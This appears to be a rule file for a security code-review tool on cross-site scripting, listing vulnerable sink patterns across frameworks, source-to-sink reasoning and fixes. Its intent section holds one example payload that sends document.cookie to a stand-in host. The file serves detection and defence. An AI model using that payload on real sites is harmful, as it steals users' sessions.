---
id: XSS
severity_max: HIGH
applies_to: all
---

# Cross-Site Scripting (XSS)

## Intent

User input (L1) rendered directly into HTML/DOM without escaping. Attacker injects `<script>fetch('//evil.com/?c='+document.cookie)</script>` to steal sessions, JWT, phishing.

## Search patterns

- `innerHTML = userInput`
- `document.write(req.query.x)`
- `dangerouslySetInnerHTML={{ __html: userContent }}`
- `v-html="userContent"` (Vue)
- `[innerHTML]="userContent"` (Angular)
- Server: `res.send("<div>" + req.query.name + "</div>")`
- `{{{ variable }}}` (triple brace = unescaped in Handlebars)

## L1-L4 reasoning

Source must be L1 reaching DOM/HTML sink without escaping. Framework auto-escaping (React JSX, Angular template binding) = NOT a finding unless explicitly bypassed.

## Fix

Use `.textContent` instead of `.innerHTML`. Use framework safe APIs. For rich text, use DOMPurify.

## Related rules

`11-csrf` (XSS can forge CSRF from inside session), `04-idor` (XSS steals token → IDOR)
